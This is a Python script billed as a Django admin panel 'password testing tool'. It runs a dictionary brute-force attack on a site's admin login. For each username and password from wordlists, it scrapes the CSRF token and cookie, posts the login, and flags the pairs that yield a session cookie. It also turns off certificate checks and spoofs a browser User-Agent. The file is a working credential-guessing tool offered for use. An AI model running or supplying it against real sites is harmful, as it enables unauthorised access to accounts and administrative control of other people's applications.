#!/usr/bin/env python

from operator import eq
import urllib3
import argparse
from bs4 import BeautifulSoup
import logging
import sys
from colorama import Back, Fore, Style


def banner():
    print(Fore.GREEN, Style.BRIGHT,"""
---------------------------------------------------
  ____  _                                         
 |  _ \(_) __ _ _ __   __ _  ___                  
 | | | | |/ _` | '_ \ / _` |/ _ \                 
 | |_| | | (_| | | | | (_| | (_) |                
 |____// |\__,_|_| |_|\__, |\___/                 
     |__/             |___/                       
  _   _            _           _                _ 
 | | | |_ __   ___| |__   __ _(_)_ __   ___  __| |
 | | | | '_ \ / __| '_ \ / _` | | '_ \ / _ \/ _` |
 | |_| | | | | (__| | | | (_| | | | | |  __/ (_| |
  \___/|_| |_|\___|_| |_|\__,_|_|_| |_|\___|\__,_|

----------------------------------------------------                                                  

Django Admin Panel password testing tool v0.1 - by n3bojs4   
    """,Style.RESET_ALL)



# Get arguments

parser = argparse.ArgumentParser()
parser.add_argument("-domain",help="Domain for the django admin login page.",required=True)
parser.add_argument("-scheme",help="http or https scheme.",required=True)
parser.add_argument("-uri",help="uri for the admin login page, \"/admin/login/\" is the most common.",required=True)
parser.add_argument("-userdict",help="dictionnary file for user list.",required=True)
parser.add_argument("-passwdict",help="dictionnary file for password.",required=True)
parser.add_argument("-onlygood",help="Show only good attempts.",action='store_true', default=False, required=False)
parser.add_argument("-l",help="Log to a file.",required=False)

# Show banner
banner()

# Parse args
args = parser.parse_args()

domain = args.domain
scheme = args.scheme
uri = args.uri
userdict = args.userdict
passwords = args.passwdict
onlygood = args.onlygood
logfile = args.l

admin_url = scheme + '://' + domain + uri


# Disable warnings for certs
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# By default certs are ignored
http = urllib3.PoolManager(cert_reqs='CERT_NONE')

# initiate logger if logging is on
if logfile:
    logger = logging.getLogger()
    try:
        LOGFILE = logging.FileHandler(logfile)
    except:
        print("cannot open logfile:",logfile)
        exit(1)
    formatter = logging.Formatter('%(asctime)s - %(message)s')
    LOGFILE.setFormatter(formatter)
    logger.addHandler(LOGFILE)



# Opening dict files
try:
    USERS = open(userdict,'r')
except:
    print("cannot open users file :",userdict)
    exit(1)

try:
    PASSWORDS = open(passwords,'r')
except:
    print("cannot open password file :",userdict)
    exit(1)



headers={'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
            'Referer': domain + uri }

# Functions

def Authenticate(admin_url,username,password):
    r = http.request('GET', admin_url, headers=headers)
    login_page = r.data
    Cookies = r.headers["Set-Cookie"]
    soup = BeautifulSoup(login_page, 'html.parser')

    # Getting the csrf token
    csrfmiddlewaretoken = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']

    # Getting next page
    nextpage = soup.find('input', {'name': 'next'})['value']
    
    # creating the fields and the headers
    headers["Cookie"] = Cookies
    
    payload = "csrfmiddlewaretoken="+csrfmiddlewaretoken+"&"+"username="+username+"&"+"next="+nextpage+"&password="+password
    
    postlogin = http.request('POST', admin_url, headers=headers, body=payload, redirect=False)
    data = postlogin.data.decode('utf-8')

    if "CSRF" in data:
        msg = "CSRF token missing or invalid !"
        print(msg)
        if logfile:
            logger.warning(msg)
    if "Please" in data and onlygood is False:
        msg = "Trying username:" + username + " password:" + password + " FAILED"
        print(msg)
        if logfile:
            logger.warning(msg)
    if postlogin.status == 302 :
        if "sessionid" in postlogin.headers["Set-Cookie"]:
            msg = "SUCCESS: Found a valid account !!! --> username:" + username + " pass:" + password
            print(Back.YELLOW+Fore.RED+Style.BRIGHT+msg+Style.RESET_ALL)
            if logfile:
                logger.warning(msg)
        else:
            msg = "SUCCESS: It seems we found a valid account --> username:" + username + " pass:" + password + " but no sessionid cookie has been set, check manually !"
            print(Back.YELLOW+Fore.RED+Style.BRIGHT+msg+Style.RESET_ALL)
            if logfile:
                logger.warning(msg)
    


# Main


userlist = list(set([(word.strip()) for word in USERS.readlines()]))
passwordlist = list(set([(word.strip()) for word in PASSWORDS.readlines()]))

print("Starting the attack against",admin_url,"...")

for user in userlist:
    for password in passwordlist:
        Authenticate(admin_url,user,password)


